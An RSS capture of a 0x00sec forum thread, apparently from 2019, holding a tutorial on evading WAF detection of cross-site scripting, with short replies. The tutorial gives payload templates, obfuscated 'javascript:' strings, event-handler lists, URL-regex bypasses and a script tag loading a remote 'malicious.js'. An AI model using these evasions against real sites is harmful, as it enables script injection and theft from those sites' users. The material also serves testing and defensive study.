<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>[FUN] Bypass XSS Detection WAF</title>
    <link>https://0x00sec.org/t/fun-bypass-xss-detection-waf/12228</link>
    <description>Basically sad life like dog bite, a scary world. Sorry for my English.

A little simple knowledge for everyone.

This article focuses on WAF&#39;s ability to bypass the ability to detect Cross Site Scripting (XSS).

The follow:

- Determining payload structure: Determining various payload structures for a given context provides a precise idea of the optimal testing approach.

- Probing: Probing, involves testing various strings against the target&#39;s security mechanisms.

- Obfuscation: obfuscation/other tweaks payload if required.

The returned responses will help us analyze the assumptions about the solution used.
&lt;h3&gt;I/Introduction&lt;/h3&gt;
Cross-Site Scripting (XSS) attacks are a type of injection. https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
&lt;h3&gt;II/HTML&lt;/h3&gt;
Inside Tag:
&lt;pre class=&quot;lang:default decode:true &quot;&gt;&amp;lt;input type=&quot;text&quot; value=&quot;$input&quot;&amp;gt;&lt;/pre&gt;
Outside Tag:
&lt;pre class=&quot;lang:default decode:true &quot;&gt; &amp;lt;span&amp;gt;You entered $input&amp;lt;/span&amp;gt;&lt;/pre&gt;
&lt;ul&gt;
 	&lt;li&gt;&lt;strong&gt;Outside Tag: primary character for starting an HTML tag&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
According to the HTML specification, a tag name must start with an alphabet

=&amp;gt; the information can be used to determine the Regex match the tag name.
&lt;pre class=&quot;lang:default decode:true&quot;&gt;&amp;lt;dEv - If fails, &amp;lt;[a-zA-Z]+ 
&amp;lt;d3V - If fails, &amp;lt;[a-zA-Z0-9]+ 
&amp;lt;d|3v - If fails, &amp;lt;.+
&amp;lt;svg - If passes, no tag checking is in place
&amp;lt;dev - If fails,&amp;lt;[a-z]+
x&amp;lt;dev - If passes,^&amp;lt;[a-z]+&lt;/pre&gt;
Without any of allowed by the security mechanism, it is almost impossible bypass. Such filtering rules are not preferred due to high false positives.

If unblock, a number payload schemes -&amp;gt; new payload created.

&lt;strong&gt;#1&lt;/strong&gt;
&lt;pre class=&quot;lang:default decode:true&quot;&gt;&amp;lt;{tag}{filler}{event_handler}{?filler}={?filler}{javascript}{?filler}{&amp;gt;,//,Space,Tab,LF}&lt;/pre&gt;
Once an appropriate {tag} found -&amp;gt; Predictive regular expressions are used to match filler between tag and event handler.
&lt;pre class=&quot;lang:default decode:true &quot;&gt;&amp;lt;tag%0axxx - if fails, [\s\n]+
&amp;lt;tag%0dxxx&amp;gt; - If fails, [\s\n\r+]+
&amp;lt;tag/~/xxx - If fails, .+
&amp;lt;tag xxx - If fails, {space}
&amp;lt;tag%09xxx - if fails, [\s]
&amp;lt;tag%09%09xxx - if fails, \s+
&amp;lt;tag/xxx - If fails, [\s/]+
&lt;/pre&gt;
Event handling is one of the most important parts of the payload structure.

Usually it will be combined with a regular Regex
&lt;pre class=&quot;lang:default decode:true &quot;&gt;on\w+&lt;/pre&gt;
or blacklist
&lt;pre class=&quot;lang:default decode:true &quot;&gt;on(load|click|error|show)&lt;/pre&gt;
The first regular expression is very limited and cannot bypass, while blacklist are often bypass by using lesser known event handlers that may no t in blacklist.
&lt;pre class=&quot;lang:default decode:true &quot;&gt;&amp;lt;tag{filler}onxxx - If fails, on\w+. If passes, on(load|click|error|show)
&amp;lt;tag{filler}onclick - If passes, no event handler checking regular expression is in place&lt;/pre&gt;
If the regular expression to be &#39; on\w+&#39; this expression cannot bypass because all event handlers start with on =&amp;gt; next payload scheme.

If the regular expression follows the blacklist, we will find event handlers that are not blacklisted. If all event handlers are blacklisted -&amp;gt; next payload scheme.

Example:
&lt;pre class=&quot;lang:default decode:true &quot;&gt;onauxclick
ondblclick
oncontextmenu
onmouseleave
ontouchcancel&lt;/pre&gt;
The testing of fillers to = is similar filler earlier and should be only tested if &#39;&amp;lt;tag{filler}{event_handler}=d3v&#39; =&amp;gt; blocked by the security mechanism.

The next component JavaScript to be executed. This is the part of the payload, but making regular expression assumptions used to match it is not required because JavaScript code is arbitrary and therefore cannot match predefined patterns.

=&amp;gt; Point in now, all components of the load are put together and payload only needs to be closed
&lt;pre class=&quot;lang:default decode:true&quot;&gt;&amp;lt;payload%0a 
&amp;lt;payload%0d 
&amp;lt;payload%09
&amp;lt;payload&amp;gt;
&amp;lt;payload
&amp;lt;payload{space}
&amp;lt;payload//&lt;/pre&gt;
HTML specification allows
&lt;pre class=&quot;lang:default decode:true&quot;&gt;&amp;lt;tag{white space}{anything here}&amp;gt;&lt;/pre&gt;
which indicates that an HTML tag such as
&lt;pre class=&quot;lang:default decode:true &quot;&gt;&amp;lt;a href=&#39;http://example.com&#39; any text can be placed here as long as there&#39;s a greater-than sign somewhere later in the HTML document&amp;gt;&lt;/pre&gt;
is valid. This attribute of HTML tags helps an attacker to inject HTML tags in the ways mentioned above.

&lt;strong&gt;#2&lt;/strong&gt;
&lt;pre class=&quot;lang:default decode:true &quot;&gt;&amp;lt;sCriPt{filler}sRc{?filler}={?filler}{url}{?filler}{&amp;gt;,//,Space,Tab,LF}&lt;/pre&gt;
Testing similar to the previous payload scheme. That ? can be used at the end of the URL (if the filler is not used after the URL) instead of ending the tag.

Character follows ? will be considered part of the URL until &amp;gt; is encountered. With &amp;lt;script&amp;gt; tags, most security rules can be detected.

&amp;lt;object&amp;gt; tags can be created payload using the same payload scheme:
&lt;pre class=&quot;lang:default decode:true &quot;&gt;&amp;lt;obJecT{filler}data{?filler}={?filler}{url}{?filler}{&amp;gt;,//,Space,Tab,LF}&lt;/pre&gt;
&lt;strong&gt;#3&lt;/strong&gt;

Two variants:
&lt;ul&gt;
 	&lt;li&gt;Plain&lt;/li&gt;
 	&lt;li&gt;Obfuscatable&lt;/li&gt;
&lt;/ul&gt;
Simple variants combined by patterns like
&lt;pre class=&quot;lang:default decode:true&quot;&gt;href[\s]{0,}=[\s]{0,}javascript:.&lt;/pre&gt;
Its structure:
&lt;pre class=&quot;lang:default decode:true &quot;&gt;&amp;lt;A{filler}hReF{?filler}={?filler}JavaScript:{javascript}{?filler}{&amp;gt;,//,Space,Tab,LF}&lt;/pre&gt;
Obfuscatable payload variant structure:
&lt;pre class=&quot;lang:default decode:true &quot;&gt;&amp;lt;A{filler}hReF{?filler}={?filler}{quote}{special}:{javascript}{quote}{?filler}{&amp;gt;,//,Space,Tab,L
F}&lt;/pre&gt;
Difference is &lt;strong&gt;{special}&lt;/strong&gt; component as well as the &lt;strong&gt;{quote}&lt;/strong&gt;&lt;strong&gt;.&lt;/strong&gt;

&lt;strong&gt;{special}&lt;/strong&gt; ref to an obfuscated version:
&lt;pre class=&quot;lang:default decode:true&quot;&gt;j%0aAv%0dasCr%09ipt:
J%0aa%0av%0aa%0as%0ac%0ar%0ai%0ap%0aT%0a:
J%0aa%0dv%09a%0as%0dc%09r%0ai%0dp%09T%0d%0a:&lt;/pre&gt;
In some cases, numeric character encoding can also be used to evade detection. As well as decimal and hexadecimal can be used.
&lt;pre class=&quot;lang:default decode:true&quot;&gt;&amp;amp;#74;avascript&amp;amp;colon;
jav&amp;amp;#x61;&amp;amp;#115;cript:&lt;/pre&gt;
Two techniques of obfuscation can be used together if needed
&lt;pre class=&quot;lang:default decode:true &quot;&gt;&amp;amp;#74;ava%0a%0d%09script&amp;amp;colon;&lt;/pre&gt;
&lt;h3&gt;Exe and Non&lt;/h3&gt;
Can be divided into Execution and Non-exe based on whether the injected load can be executed without any special assistance. Non-exe occurs when the input gets reflected within a HTML comment
&lt;pre class=&quot;lang:default decode:true&quot;&gt; &amp;lt;--$input--&amp;gt;&lt;/pre&gt;
or between the following tags
&lt;pre class=&quot;lang:default decode:true &quot;&gt;&amp;lt;style&amp;gt;
&amp;lt;title&amp;gt;
&amp;lt;noembed&amp;gt;
&amp;lt;template&amp;gt;
&amp;lt;noscript&amp;gt;
&amp;lt;textarea&amp;gt;&lt;/pre&gt;
These tags must be closed to execute payload. The only difference between executable and  non-exe is the test of {closing tag} component.
&lt;pre class=&quot;lang:default decode:true &quot;&gt;&amp;lt;/tag&amp;gt;
&amp;lt;/tAg/x&amp;gt;
&amp;lt;/tag{space}&amp;gt;
&amp;lt;/tag//&amp;gt;
&amp;lt;/tag%0a&amp;gt;
&amp;lt;/tag%0d&amp;gt;
&amp;lt;/tag%09&amp;gt;&lt;/pre&gt;
If closing tag scheme is discovered
&lt;pre class=&quot;lang:default decode:true &quot;&gt;{closing tag}{any payload from executable payload section}&lt;/pre&gt;
=&amp;gt; can used for successful injection.
&lt;h5&gt;Inside Tag&lt;/h5&gt;
Primary character is the quote used to enclose the attribute value.

Example: input
&lt;pre class=&quot;lang:default decode:true&quot;&gt;&amp;lt;input value=&quot;$input&quot; type=&quot;text&quot;&amp;gt;&lt;/pre&gt;
-&amp;gt; Primary character &quot;

In some cases, primary character is not required to break out.
&lt;h5&gt;Event Handler&lt;/h5&gt;
Input reflected as the value of src attribute of script/iframe tag:
&lt;pre class=&quot;lang:default decode:true &quot;&gt;&amp;lt;script src=&quot;$input&quot;&amp;gt;&lt;/pre&gt;
=&amp;gt; malicious script/web phishing..etc can be loaded directly
&lt;pre class=&quot;lang:default decode:true &quot;&gt;&amp;lt;script src=&quot;http://domain.com/malicious.js&quot;&amp;gt;&lt;/pre&gt;
&lt;h5&gt;Bypass URL Matching Regular Expressions&lt;/h5&gt;
&lt;pre class=&quot;lang:default decode:true &quot;&gt;//example.com/xss.js bypasses http(?s)://
////////example.com/xss.js bypasses (?:http(?s):?)?//
/\///\\/example.com/xss.js bypasses (?:http(?s):?)?//+&lt;/pre&gt;
&lt;h6&gt;srcdoc&lt;/h6&gt;
Input reflected as the value of srcdoc attribute of iframe tag:
&lt;pre class=&quot;lang:default decode:true &quot;&gt;&amp;lt;iframe srcdoc=&quot;$input&quot;&amp;gt;&lt;/pre&gt;
an escaped (HTML entities) HTML document can be supplied as the payload
&lt;pre class=&quot;lang:default decode:true &quot;&gt;&amp;lt;iframe srcdoc=&quot;&amp;amp;lt;svg/onload=alert()&amp;amp;gt;&quot;&amp;gt;&lt;/pre&gt;
&lt;h6&gt;Generic Attributes&lt;/h6&gt;
All of the above cases do not require any bypassing techniques, except the last case can be omitted using the techniques used in the HTML context.
&lt;pre class=&quot;lang:default decode:true &quot;&gt;&amp;lt;input type=&quot;text&quot; value=&quot;&quot;/onfocus=&quot;alert()$input&quot;&amp;gt;&lt;/pre&gt;
We have two categories based on the interactivity of the concerned tag:

&lt;strong&gt;Interactable&lt;/strong&gt;

Input reflected in the tags can interact (clicking, hovering, focusing etc.,) only a quote is needed to break out.
&lt;pre class=&quot;lang:default decode:true &quot;&gt;{quote}{filler}{event_handler}{?filler}={?filler}{javascript}&lt;/pre&gt;
Checking with WAF blocked using:
&lt;pre class=&quot;lang:default decode:true &quot;&gt;x&quot;y&lt;/pre&gt;
Event handler an important role here because this is the only component that possible detected by WAF. Each tag supports some event handlers and is up to the user to search for such cases, but there are some event handlers that can be linked to any of the tags:
&lt;pre class=&quot;lang:default decode:true &quot;&gt;onmousedown
onmouseenter
onmouseleave
onmousemove
onmouseout
onmouseover
onmouseup
onclick
onauxclick
ondblclick
ondrag
ondragend
ondragenter
ondragexit
ondragleave
ondragover
ondragstart&lt;/pre&gt;
&lt;strong&gt;Intractable&lt;/strong&gt;

Breakout of the tag is required to execute the payload if input reflected within a tag which cannot be interacted.
&lt;pre class=&quot;lang:default decode:true &quot;&gt;{quote}&amp;gt;{any payload scheme from html context section}&lt;/pre&gt;
&lt;h5&gt;JavaScript&lt;/h5&gt;
&lt;strong&gt; String Variable&lt;/strong&gt;

The most common is reflection within a string variable. This is common because developers usually assign user input to a variable instead of using them directly
&lt;pre class=&quot;lang:default decode:true&quot;&gt;var name = &#39;$input&#39;;&lt;/pre&gt;
&lt;ul&gt;
 	&lt;li&gt;
&lt;pre class=&quot;lang:default decode:true&quot;&gt;{quote}{delimiter}{javascript}{delimiter}{quote}&lt;/pre&gt;
Where delimiter are usually JavaScript operators like ^.

If user input in a single quoted string variable:&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&quot;lang:default decode:true &quot;&gt;&#39;%{javascript}%&#39;
&#39;|{javascript}|&#39;
&#39;&amp;lt;{javascript}&amp;lt;&#39;
&#39;&amp;gt;{javascript}&amp;gt;&#39;
&#39;^{javascript}^&#39;
&#39;*{javascript}*&#39;
&#39;+{javascript}+&#39;
&#39;/{javascript}/&#39;&lt;/pre&gt;
&lt;ul&gt;
 	&lt;li&gt;
&lt;pre class=&quot;lang:default decode:true &quot;&gt;{quote}{delimiter}{javascript}//&lt;/pre&gt;
Use a single line comment to comment the rest of the code in line to valid syntax.&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&quot;lang:default decode:true &quot;&gt;&#39;&amp;lt;{javascript}//&#39;
&#39;|{javascript}//&#39;
&#39;^{javascript}//&lt;/pre&gt;
&lt;strong&gt;BLOCKS&lt;/strong&gt;

Example
&lt;pre class=&quot;lang:default decode:true&quot;&gt; if (a &amp;gt; b){
 xnxx_func(&#39;&lt;strong&gt;&#39;);}}alert();if(true){(&#39;&lt;/strong&gt;&#39;);
 }&lt;/pre&gt;
First &lt;strong&gt;}&lt;/strong&gt; close block

Second &lt;strong&gt;}&lt;/strong&gt; dummy func  as test

&lt;strong&gt;alert();&lt;/strong&gt; dummy function as test

&lt;strong&gt;if(true){&lt;/strong&gt; starts an if condition block to syntax valid.

&lt;strong&gt;(&#39;&lt;/strong&gt; combines with remains of function.

The payload structure depends on the code itself and this uncertainty makes it difficult to detect (can add obfuscated).
&lt;pre class=&quot;lang:default decode:true &quot;&gt;&#39;);%0a}%0d}%09alert();/*xnxx.com*/if(true){//xnxx.com%0a(&#39;&lt;/pre&gt;
&lt;pre class=&quot;lang:default decode:true &quot;&gt; &amp;lt;/scRipT{?filler}&amp;gt;{html xnxx.com}&lt;/pre&gt;
can be used to break out and execute payload but easily detected.
&lt;h5&gt;Finally, testing in process hunter bug.&lt;/h5&gt;
&lt;pre class=&quot;lang:default decode:true&quot;&gt;Name: &lt;a href=&quot;https://modsecurity.org/&quot;&gt;ModSecurity&lt;/a&gt;
Name: &lt;a href=&quot;https://www.wordfence.com/&quot;&gt;Wordfence&lt;/a&gt;
Name: &lt;a href=&quot;https://www.cloudflare.com/&quot;&gt;Cloudflare&lt;/a&gt;
Name: &lt;a href=&quot;https://www.akamai.com/&quot;&gt;Akamai&lt;/a&gt;
Name: Comodo
Name: F5

There are many other firewall providers that I cannot provide publicly.
Sorry I cannot provide payload POC.
Original post: https://medium.com/@th3law/fun-bypass-xss-detection-waf-cabd431e030e

&lt;/pre&gt;
https://medium.com/secjuice/waf-evasion-techniques-718026d693d8

https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0

https://en.wikipedia.org/wiki/Numeric_character_reference</description>
    
    <lastBuildDate>Wed, 13 Mar 2019 04:17:53 +0000</lastBuildDate>
    <category>Web Hacking</category>
    <atom:link href="https://0x00sec.org/t/fun-bypass-xss-detection-waf/12228.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>[FUN] Bypass XSS Detection WAF</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/fun-bypass-xss-detection-waf/12228/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/fun-bypass-xss-detection-waf/12228/6</link>
        <pubDate>Thu, 11 Apr 2019 16:10:07 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-12228-6</guid>
        <source url="https://0x00sec.org/t/fun-bypass-xss-detection-waf/12228.rss">[FUN] Bypass XSS Detection WAF</source>
      </item>
      <item>
        <title>[FUN] Bypass XSS Detection WAF</title>
        <dc:creator><![CDATA[th3law]]></dc:creator>
        <description><![CDATA[
            <p>Sorry, thanks you <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
          <p><a href="https://0x00sec.org/t/fun-bypass-xss-detection-waf/12228/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/fun-bypass-xss-detection-waf/12228/5</link>
        <pubDate>Wed, 13 Mar 2019 04:17:25 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-12228-5</guid>
        <source url="https://0x00sec.org/t/fun-bypass-xss-detection-waf/12228.rss">[FUN] Bypass XSS Detection WAF</source>
      </item>
      <item>
        <title>[FUN] Bypass XSS Detection WAF</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Hey man just a reminder:</p>
<aside class="quote" data-post="1" data-topic="181">
  <div class="title">
    <div class="quote-controls"></div>
    <img alt="" width="20" height="20" src="/user_avatar/0x00sec.org/pry0cc/40/6_2.png" class="avatar">
    <a href="https://0x00sec.org/t/how-to-format-your-code/181">How to format your code!</a> <a class="badge-wrapper  bullet" href="https://0x00sec.org/c/site-feedback/announcements/17"><span class="badge-category-parent-bg" style="background-color: #808281;"></span><span class="badge-category-bg" style="background-color: #AB9364;"></span><span style="" data-drop-close="true" class="badge-category clear-badge" title="This category is where you will come for announcements about the 0x00sec project.">0x00sec Announcements</span></a>
  </div>
  <blockquote>
    Hey 0x00’ers! I am happy to announce we have decent syntax highlight support! <img src="https://0x00sec.org/images/emoji/twitter/fireworks.png?v=9" title="fireworks" alt="fireworks" class="emoji"> 
To format your code just embody your code with three backticks. You can also put the language after the first line of backticks if it doesn’t specifiy it. In future I will be adding x86 and other types of ASM. If you need any new languages let me know! 
 ```ruby 
def hello
   puts "world"
end
```

makes 
def hello
    puts "world"
end

Have fun <img src="https://0x00sec.org/images/emoji/twitter/stuck_out_tongue.png?v=9" title="stuck_out_tongue" alt="stuck_out_tongue" class="emoji">
  </blockquote>
</aside>

          <p><a href="https://0x00sec.org/t/fun-bypass-xss-detection-waf/12228/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/fun-bypass-xss-detection-waf/12228/4</link>
        <pubDate>Tue, 12 Mar 2019 21:05:21 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-12228-4</guid>
        <source url="https://0x00sec.org/t/fun-bypass-xss-detection-waf/12228.rss">[FUN] Bypass XSS Detection WAF</source>
      </item>
      <item>
        <title>[FUN] Bypass XSS Detection WAF</title>
        <dc:creator><![CDATA[HACKER]]></dc:creator>
        <description><![CDATA[
            <p>I &lt;3 XSS.</p>
<p>Thank you for this topic, I like.</p>
          <p><a href="https://0x00sec.org/t/fun-bypass-xss-detection-waf/12228/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/fun-bypass-xss-detection-waf/12228/3</link>
        <pubDate>Tue, 12 Mar 2019 18:40:20 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-12228-3</guid>
        <source url="https://0x00sec.org/t/fun-bypass-xss-detection-waf/12228.rss">[FUN] Bypass XSS Detection WAF</source>
      </item>
      <item>
        <title>[FUN] Bypass XSS Detection WAF</title>
        <dc:creator><![CDATA[hoboscientist]]></dc:creator>
        <description><![CDATA[
            <p>Due to my low understanding of Web Application security and penetration testing domain, I couldn’t understand fully about the topic but nonetheless it is a good article, 10/10 would bookmark it for future reference.</p>
          <p><a href="https://0x00sec.org/t/fun-bypass-xss-detection-waf/12228/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/fun-bypass-xss-detection-waf/12228/2</link>
        <pubDate>Tue, 12 Mar 2019 16:31:31 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-12228-2</guid>
        <source url="https://0x00sec.org/t/fun-bypass-xss-detection-waf/12228.rss">[FUN] Bypass XSS Detection WAF</source>
      </item>
      <item>
        <title>[FUN] Bypass XSS Detection WAF</title>
        <dc:creator><![CDATA[th3law]]></dc:creator>
        <description><![CDATA[
            <p>Basically sad life like dog bite, a scary world. Sorry for my English.</p>
<p>A little simple knowledge for everyone.</p>
<p>This article focuses on WAF’s ability to bypass the ability to detect Cross Site Scripting (XSS).</p>
<p>The follow:</p>
<ul>
<li>
<p>Determining payload structure: Determining various payload structures for a given context provides a precise idea of the optimal testing approach.</p>
</li>
<li>
<p>Probing: Probing, involves testing various strings against the target’s security mechanisms.</p>
</li>
<li>
<p>Obfuscation: obfuscation/other tweaks payload if required.</p>
</li>
</ul>
<p>The returned responses will help us analyze the assumptions about the solution used.</p>
<h3>I/Introduction</h3>
Cross-Site Scripting (XSS) attacks are a type of injection. https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
<h3>II/HTML</h3>
Inside Tag:
<pre>&lt;input type="text" value="$input"&gt;</pre>
Outside Tag:
<pre> &lt;span&gt;You entered $input&lt;/span&gt;</pre>
<ul>
 	<li><strong>Outside Tag: primary character for starting an HTML tag</strong></li>
</ul>
According to the HTML specification, a tag name must start with an alphabet
<p>=&gt; the information can be used to determine the Regex match the tag name.</p>
<pre>&lt;dEv - If fails, &lt;[a-zA-Z]+ 
&lt;d3V - If fails, &lt;[a-zA-Z0-9]+ 
&lt;d|3v - If fails, &lt;.+
&lt;svg - If passes, no tag checking is in place
&lt;dev - If fails,&lt;[a-z]+
x&lt;dev - If passes,^&lt;[a-z]+</pre>
<p>Without any of allowed by the security mechanism, it is almost impossible bypass. Such filtering rules are not preferred due to high false positives.</p>
<p>If unblock, a number payload schemes -&gt; new payload created.</p>
<p><strong><span class="hashtag">#1</span></strong></p>
<pre>&lt;{tag}{filler}{event_handler}{?filler}={?filler}{javascript}{?filler}{&gt;,//,Space,Tab,LF}</pre>
<p>Once an appropriate {tag} found -&gt; Predictive regular expressions are used to match filler between tag and event handler.</p>
<pre>&lt;tag%0axxx - if fails, [\s\n]+
&lt;tag%0dxxx&gt; - If fails, [\s\n\r+]+
&lt;tag/~/xxx - If fails, .+
&lt;tag xxx - If fails, {space}
&lt;tag%09xxx - if fails, [\s]
&lt;tag%09%09xxx - if fails, \s+
&lt;tag/xxx - If fails, [\s/]+
</pre>
<p>Event handling is one of the most important parts of the payload structure.</p>
<p>Usually it will be combined with a regular Regex</p>
<pre>on\w+</pre>
<p>or blacklist</p>
<pre>on(load|click|error|show)</pre>
<p>The first regular expression is very limited and cannot bypass, while blacklist are often bypass by using lesser known event handlers that may no t in blacklist.</p>
<pre>&lt;tag{filler}onxxx - If fails, on\w+. If passes, on(load|click|error|show)
&lt;tag{filler}onclick - If passes, no event handler checking regular expression is in place</pre>
<p>If the regular expression to be ’ on\w+’ this expression cannot bypass because all event handlers start with on =&gt; next payload scheme.</p>
<p>If the regular expression follows the blacklist, we will find event handlers that are not blacklisted. If all event handlers are blacklisted -&gt; next payload scheme.</p>
<p>Example:</p>
<pre>onauxclick
ondblclick
oncontextmenu
onmouseleave
ontouchcancel</pre>
<p>The testing of fillers to = is similar filler earlier and should be only tested if ‘&lt;tag{filler}{event_handler}=d3v’ =&gt; blocked by the security mechanism.</p>
<p>The next component JavaScript to be executed. This is the part of the payload, but making regular expression assumptions used to match it is not required because JavaScript code is arbitrary and therefore cannot match predefined patterns.</p>
<p>=&gt; Point in now, all components of the load are put together and payload only needs to be closed</p>
<pre>&lt;payload%0a 
&lt;payload%0d 
&lt;payload%09
&lt;payload&gt;
&lt;payload
&lt;payload{space}
&lt;payload//</pre>
<p>HTML specification allows</p>
<pre>&lt;tag{white space}{anything here}&gt;</pre>
<p>which indicates that an HTML tag such as</p>
<pre>&lt;a href='http://example.com' any text can be placed here as long as there's a greater-than sign somewhere later in the HTML document&gt;</pre>
<p>is valid. This attribute of HTML tags helps an attacker to inject HTML tags in the ways mentioned above.</p>
<p><strong><span class="hashtag">#2</span></strong></p>
<pre>&lt;sCriPt{filler}sRc{?filler}={?filler}{url}{?filler}{&gt;,//,Space,Tab,LF}</pre>
<p>Testing similar to the previous payload scheme. That ? can be used at the end of the URL (if the filler is not used after the URL) instead of ending the tag.</p>
<p>Character follows ? will be considered part of the URL until &gt; is encountered. With &lt;script&gt; tags, most security rules can be detected.</p>
<p>&lt;object&gt; tags can be created payload using the same payload scheme:</p>
<pre>&lt;obJecT{filler}data{?filler}={?filler}{url}{?filler}{&gt;,//,Space,Tab,LF}</pre>
<p><strong><span class="hashtag">#3</span></strong></p>
<p>Two variants:</p>
<ul>
 	<li>Plain</li>
 	<li>Obfuscatable</li>
</ul>
Simple variants combined by patterns like
<pre>href[\s]{0,}=[\s]{0,}javascript:.</pre>
Its structure:
<pre>&lt;A{filler}hReF{?filler}={?filler}JavaScript:{javascript}{?filler}{&gt;,//,Space,Tab,LF}</pre>
Obfuscatable payload variant structure:
<pre>&lt;A{filler}hReF{?filler}={?filler}{quote}{special}:{javascript}{quote}{?filler}{&gt;,//,Space,Tab,L
F}</pre>
Difference is <strong>{special}</strong> component as well as the <strong>{quote}</strong><strong>.</strong>
<p><strong>{special}</strong> ref to an obfuscated version:</p>
<pre>j%0aAv%0dasCr%09ipt:
J%0aa%0av%0aa%0as%0ac%0ar%0ai%0ap%0aT%0a:
J%0aa%0dv%09a%0as%0dc%09r%0ai%0dp%09T%0d%0a:</pre>
<p>In some cases, numeric character encoding can also be used to evade detection. As well as decimal and hexadecimal can be used.</p>
<pre>&amp;#74;avascript&amp;colon;
jav&amp;#x61;&amp;#115;cript:</pre>
<p>Two techniques of obfuscation can be used together if needed</p>
<pre>&amp;#74;ava%0a%0d%09script&amp;colon;</pre>
<h3>Exe and Non</h3>
Can be divided into Execution and Non-exe based on whether the injected load can be executed without any special assistance. Non-exe occurs when the input gets reflected within a HTML comment
<pre> &lt;--$input--&gt;</pre>
or between the following tags
<pre>&lt;style&gt;
&lt;title&gt;
&lt;noembed&gt;
&lt;template&gt;
&lt;noscript&gt;
&lt;textarea&gt;</pre>
These tags must be closed to execute payload. The only difference between executable and  non-exe is the test of {closing tag} component.
<pre>&lt;/tag&gt;
&lt;/tAg/x&gt;
&lt;/tag{space}&gt;
&lt;/tag//&gt;
&lt;/tag%0a&gt;
&lt;/tag%0d&gt;
&lt;/tag%09&gt;</pre>
If closing tag scheme is discovered
<pre>{closing tag}{any payload from executable payload section}</pre>
=&gt; can used for successful injection.
<h5>Inside Tag</h5>
Primary character is the quote used to enclose the attribute value.
<p>Example: input</p>
<pre>&lt;input value="$input" type="text"&gt;</pre>
<p>-&gt; Primary character "</p>
<p>In some cases, primary character is not required to break out.</p>
<h5>Event Handler</h5>
Input reflected as the value of src attribute of script/iframe tag:
<pre>&lt;script src="$input"&gt;</pre>
=&gt; malicious script/web phishing..etc can be loaded directly
<pre>&lt;script src="http://domain.com/malicious.js"&gt;</pre>
<h5>Bypass URL Matching Regular Expressions</h5>
<pre>//example.com/xss.js bypasses http(?s)://
////////example.com/xss.js bypasses (?:http(?s):?)?//
/\///\\/example.com/xss.js bypasses (?:http(?s):?)?//+</pre>
<h6>srcdoc</h6>
Input reflected as the value of srcdoc attribute of iframe tag:
<pre>&lt;iframe srcdoc="$input"&gt;</pre>
an escaped (HTML entities) HTML document can be supplied as the payload
<pre>&lt;iframe srcdoc="&amp;lt;svg/onload=alert()&amp;gt;"&gt;</pre>
<h6>Generic Attributes</h6>
All of the above cases do not require any bypassing techniques, except the last case can be omitted using the techniques used in the HTML context.
<pre>&lt;input type="text" value=""/onfocus="alert()$input"&gt;</pre>
We have two categories based on the interactivity of the concerned tag:
<p><strong>Interactable</strong></p>
<p>Input reflected in the tags can interact (clicking, hovering, focusing etc.,) only a quote is needed to break out.</p>
<pre>{quote}{filler}{event_handler}{?filler}={?filler}{javascript}</pre>
<p>Checking with WAF blocked using:</p>
<pre>x"y</pre>
<p>Event handler an important role here because this is the only component that possible detected by WAF. Each tag supports some event handlers and is up to the user to search for such cases, but there are some event handlers that can be linked to any of the tags:</p>
<pre>onmousedown
onmouseenter
onmouseleave
onmousemove
onmouseout
onmouseover
onmouseup
onclick
onauxclick
ondblclick
ondrag
ondragend
ondragenter
ondragexit
ondragleave
ondragover
ondragstart</pre>
<p><strong>Intractable</strong></p>
<p>Breakout of the tag is required to execute the payload if input reflected within a tag which cannot be interacted.</p>
<pre>{quote}&gt;{any payload scheme from html context section}</pre>
<h5>JavaScript</h5>
<strong> String Variable</strong>
<p>The most common is reflection within a string variable. This is common because developers usually assign user input to a variable instead of using them directly</p>
<pre>var name = '$input';</pre>
<ul>
 	<li>
<pre>{quote}{delimiter}{javascript}{delimiter}{quote}</pre>
Where delimiter are usually JavaScript operators like ^.
<p>If user input in a single quoted string variable:</p>
</li>

</ul>
<pre>'%{javascript}%'
'|{javascript}|'
'&lt;{javascript}&lt;'
'&gt;{javascript}&gt;'
'^{javascript}^'
'*{javascript}*'
'+{javascript}+'
'/{javascript}/'</pre>
<ul>
 	<li>
<pre>{quote}{delimiter}{javascript}//</pre>
Use a single line comment to comment the rest of the code in line to valid syntax.</li>
</ul>
<pre>'&lt;{javascript}//'
'|{javascript}//'
'^{javascript}//</pre>
<strong>BLOCKS</strong>
<p>Example</p>
<pre> if (a &gt; b){
 xnxx_func('<strong>');}}alert();if(true){('</strong>');
 }</pre>
<p>First <strong>}</strong> close block</p>
<p>Second <strong>}</strong> dummy func  as test</p>
<p><strong>alert();</strong> dummy function as test</p>
<p><strong>if(true){</strong> starts an if condition block to syntax valid.</p>
<p><strong>(’</strong> combines with remains of function.</p>
<p>The payload structure depends on the code itself and this uncertainty makes it difficult to detect (can add obfuscated).</p>
<pre>');%0a}%0d}%09alert();/*xnxx.com*/if(true){//xnxx.com%0a('</pre>
<pre> &lt;/scRipT{?filler}&gt;{html xnxx.com}</pre>
<p>can be used to break out and execute payload but easily detected.</p>
<h5>Finally, testing in process hunter bug.</h5>
